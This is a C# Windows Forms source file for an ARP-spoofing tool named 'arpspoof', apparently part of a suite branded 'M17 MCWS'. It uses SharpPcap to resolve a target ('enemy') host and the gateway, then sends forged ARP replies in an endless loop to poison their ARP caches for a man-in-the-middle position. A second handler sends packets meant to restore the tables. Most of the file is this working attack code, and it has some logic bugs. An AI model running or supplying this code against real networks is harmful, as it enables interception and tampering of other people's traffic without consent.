using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using SharpPcap.LibPcap;
using PuppeteerSharp.Media;
using System.Security.Cryptography;
using M15A3_MCWS.Properties;
using ArpLookup;

namespace M15A3_MCWS
{
    public partial class arpspoof : Form
    {
        public arpspoof()
        {
            InitializeComponent();
        }
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void panel1_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        private void button5_Click(object sender, EventArgs e)
        {

        }
        private void button4_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Maximized;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
        int x;
        string name;
        string id;
        PhysicalAddress admac;
        string desc;
        CaptureDeviceList cdl = CaptureDeviceList.Instance;
        ILiveDevice dev;
        LibPcapLiveDevice ldev;
        LibPcapLiveDeviceList lcdl = LibPcapLiveDeviceList.Instance;
        private void arpspoof_Load(object sender, EventArgs e)
        {
            try
            {
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface n in nics)
                {
                    if (n.OperationalStatus == OperationalStatus.Up)
                    {
                        admac = n.GetPhysicalAddress();
                        name = n.Name;
                        id = n.Id;
                        desc = n.Description;
                        break;
                    }
                    x++;
                }
                dev = cdl[x];
                ldev = lcdl[x];
                int i = 0;
                if (cdl.Count > 0)
                {
                    foreach (ILiveDevice d in cdl)
                    {
                        comboBox3.Items.Insert(i, i + ") " + d.Name + d.Description + " | MAC Address: " + d.MacAddress);
                        i++;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            dev = cdl[comboBox3.SelectedIndex];
            ldev = lcdl[comboBox3.SelectedIndex];
        }
        //The random MAC method is not mine.
        public static PhysicalAddress randmac()
        {
            var random = new Random();
            var buffer = new byte[6];
            random.NextBytes(buffer);
            var result = String.Concat(buffer.Select(x => string.Format("{0}:", x.ToString("X2"))).ToArray());
            return PhysicalAddress.Parse(result.TrimEnd(':'));
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Minimized)
            {
                this.WindowState = FormWindowState.Minimized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (textBox3.Text == null && !checkBox1.Checked)
            {
                dev.Open();
                ARP arp = new ARP(ldev);
                PhysicalAddress tmac = arp.Resolve(IPAddress.Parse(enemyipbox.Text));
                PhysicalAddress dgwm = arp.Resolve(IPAddress.Parse(textBox1.Text));
                var host = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress lip = IPAddress.Any;
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        lip = ip;
                        break;
                    }
                }
                try
                {
                    EthernetPacket ep2 = new EthernetPacket(tmac, dgwm, EthernetType.None);
                    ArpPacket arp2 = new ArpPacket(ArpOperation.Response, tmac, IPAddress.Parse(textBox1.Text), dgwm, lip);
                    ep2.PayloadPacket = arp2;
                    EthernetPacket ep1 = new EthernetPacket(dgwm, tmac, EthernetType.None);
                    ArpPacket arp1 = new ArpPacket(ArpOperation.Response, tmac, lip, dgwm, lip);
                    ep1.PayloadPacket = arp1;
                    while (true)
                    {
                        dev.SendPacket(ep2);
                        dev.SendPacket(ep1);
                    }
                }
                catch (Exception ex)
                {
                    try {
                    EthernetPacket ep1 = new EthernetPacket(dev.MacAddress, tmac, EthernetType.None);
                    ArpPacket arp1 = new ArpPacket(ArpOperation.Response, dev.MacAddress, lip, tmac, IPAddress.Parse(enemyipbox.Text));
                    ep1.PayloadPacket = arp1;
                    dev.SendPacket(ep1);
                    MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    catch (Exception exc)
                    {
                        MessageBox.Show("Fatal error, your operation might be threatened.");
                    }
                }
            }
            else
            {
                dev.Open();
                ARP arp = new ARP(ldev);
                PhysicalAddress tmac = PhysicalAddress.Parse(textBox3.Text);
                var host = Dns.GetHostEntry(Dns.GetHostName());
                PhysicalAddress dgwm = PhysicalAddress.Parse(textBox5.Text);
                IPAddress lip = IPAddress.Any;
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        lip = ip;
                        break;
                    }
                }
                try
                {
                    EthernetPacket ep2 = new EthernetPacket(tmac, dgwm, EthernetType.None);
                    ArpPacket arp2 = new ArpPacket(ArpOperation.Response, dgwm, IPAddress.Parse(textBox1.Text), tmac, lip);
                    ep2.PayloadPacket = arp2;
                    EthernetPacket ep1 = new EthernetPacket(dgwm, tmac, EthernetType.None);
                    ArpPacket arp1 = new ArpPacket(ArpOperation.Response, tmac, IPAddress.Parse(enemyipbox.Text), dgwm, lip);
                    ep1.PayloadPacket = arp1;
                    while (true)
                    {
                        dev.SendPacket(ep2);
                        dev.SendPacket(ep1);
                    }
                }
                catch (Exception ex)
                {
                    try
                    {
                        EthernetPacket ep2 = new EthernetPacket(dev.MacAddress, dgwm, EthernetType.None);
                        ArpPacket arp2 = new ArpPacket(ArpOperation.Response, dgwm, IPAddress.Parse(textBox1.Text), dev.MacAddress, IPAddress.Parse(enemyipbox.Text));
                        ep2.PayloadPacket = arp2;
                        EthernetPacket ep1 = new EthernetPacket(dgwm, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                        ArpPacket arp1 = new ArpPacket(ArpOperation.Response, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), IPAddress.Parse(enemyipbox.Text), dgwm, IPAddress.Parse(textBox1.Text));
                        ep1.PayloadPacket = arp1;
                        dev.SendPacket(ep2);
                        dev.SendPacket(ep1);
                        MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                    catch(Exception exc)
                    {
                        MessageBox.Show("Fatal error, your operation might be threatened.");
                    }
                }
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            if (textBox3.Text == null && !checkBox1.Checked)
            {
                dev.Open();
                ARP arp = new ARP(ldev);
                PhysicalAddress dgwm = arp.Resolve(IPAddress.Parse(textBox1.Text));
                PhysicalAddress tmac = Arp.Lookup(IPAddress.Parse(enemyipbox.Text));
                var host = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress lip = IPAddress.Any;
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        lip = ip;
                        break;
                    }
                }
                try
                {
                    EthernetPacket ep2 = new EthernetPacket(dev.MacAddress, dgwm, EthernetType.None);
                    ArpPacket arp2 = new ArpPacket(ArpOperation.Response, dgwm, IPAddress.Parse(textBox1.Text), dev.MacAddress, IPAddress.Parse(enemyipbox.Text));
                    ep2.PayloadPacket = arp2;
                    EthernetPacket ep1 = new EthernetPacket(dgwm, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                    ArpPacket arp1 = new ArpPacket(ArpOperation.Response, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), IPAddress.Parse(enemyipbox.Text), dgwm, IPAddress.Parse(textBox1.Text));
                    ep1.PayloadPacket = arp1;
                    MessageBox.Show("ARP spoofing has been successfully stopped; the ARP tables have been restored.", "M17 MCWS - Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    dev.SendPacket(ep2);
                    dev.SendPacket(ep1);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                dev.Open();
                PhysicalAddress dgwm = PhysicalAddress.Parse(textBox5.Text);
                PhysicalAddress tmac = PhysicalAddress.Parse(textBox3.Text);
                var host = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress lip = IPAddress.Any;
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        lip = ip;
                        break;
                    }
                }
                try
                {
                    EthernetPacket ep2 = new EthernetPacket(dev.MacAddress, dgwm, EthernetType.None);
                    ArpPacket arp2 = new ArpPacket(ArpOperation.Response, dgwm, IPAddress.Parse(textBox1.Text), dev.MacAddress, IPAddress.Parse(enemyipbox.Text));
                    ep2.PayloadPacket = arp2;
                    EthernetPacket ep1 = new EthernetPacket(dgwm, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                    ArpPacket arp1 = new ArpPacket(ArpOperation.Response, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), IPAddress.Parse(enemyipbox.Text), dgwm, IPAddress.Parse(textBox1.Text));
                    ep1.PayloadPacket = arp1;
                    MessageBox.Show("ARP spoofing has been successfully stopped; the ARP tables have been restored.", "M17 MCWS - Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    dev.SendPacket(ep2);
                    dev.SendPacket(ep1);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
    }
}